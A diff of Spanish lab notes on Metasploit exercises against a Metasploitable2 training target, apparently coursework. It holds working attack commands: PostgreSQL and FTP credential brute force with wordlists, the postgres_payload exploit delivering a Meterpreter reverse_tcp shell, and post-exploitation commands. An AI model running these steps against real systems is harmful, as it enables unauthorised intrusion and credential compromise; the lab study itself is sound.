@@ -314,17 +314,22 @@ nmap -sV -p 5432 <IP_VICTIMA>
 
 # 2. Iniciar msfconsole
 msfconsole
-search postgres type:auxiliary
 
-# 3. Fuerza bruta de credenciales PostgreSQL
+# 3. Fuerza bruta con diccionarios 
+
 use auxiliary/scanner/postgres/postgres_login
-set USER_FILE /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt
-set PASS_FILE /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt
+
+set USER_FILE /usr/share/wordlists/metasploit/postgres_default_user.txt
+set PASS_FILE /usr/share/wordlists/metasploit/postgres_default_pass.txt
+set BLANK_PASSWORDS true
+
 exploit
 
-search postgres type:exploit
-# 4. Una vez obtenidas las credenciales, conectarse
+
+
+# 4. Una vez obtenidas las credenciales seleccionar exploit
 use exploit/linux/postgres/postgres_payload
+
 set USERNAME postgres
 set PASSWORD postgres
 set DATABASE template1
@@ -332,35 +337,31 @@ set payload linux/x86/meterpreter/reverse_tcp
 
 exploit
 
-# 5. Post-explotación 
-getuid
-sysinfo
-ifconfig  
-
+# 5. Post-explotación con Meterpreter
+getuid          # Usuario actual
+sysinfo         # Sistema operativo y versión
+ifconfig        # Interfaces de red
 ```
-
 ![](attachments/{6D6DE5B3-9789-40B9-8D69-C63462B0FEE4}.png)
 ![](attachments/{5545ECE0-2813-42C6-9268-C73BBFEA21BB}.png)
-![](attachments/{91495CF9-62AB-48F9-8CA2-230DA2DDBC40}.png)
+![](attachments/{F6BEE95D-8563-4545-B0AF-CB18FF0A27A0}.png)
 ![](attachments/{B0942F80-E03B-4A62-B91F-DE299539FBBC}.png)
+
 ## Ejercicio 8 — Módulos auxiliares — FTP y VNC Server
 
 ### FTP — Fuerza bruta
 
 ```bash
-msfconsole
-
 # 1. Escanear puerto FTP
 nmap -sV -p 21 <IP_VICTIMA>
 
 # 2. Fuerza bruta FTP
+msfconsole
 use auxiliary/scanner/ftp/ftp_login
-set RHOSTS <IP_VICTIMA>
-set RPORT 21
 set USER_FILE /usr/share/wordlists/metasploit/usr.txt
 set PASS_FILE /usr/share/wordlists/metasploit/pass.txt
-set VERBOSE false
-run
+
+exploit
 
 # 3. Alternativa: usuario y contraseña en blanco (Metasploitable2 permite
 #    acceso anónimo)
@@ -368,6 +369,7 @@ set USERNAME anonymous
 set PASSWORD anonymous
 run
 ```
+![](attachments/{1B8BE9E7-78A1-48F5-883D-ADC5AB797D69}.png)
 
 ### VNC Server — Fuerza bruta
 
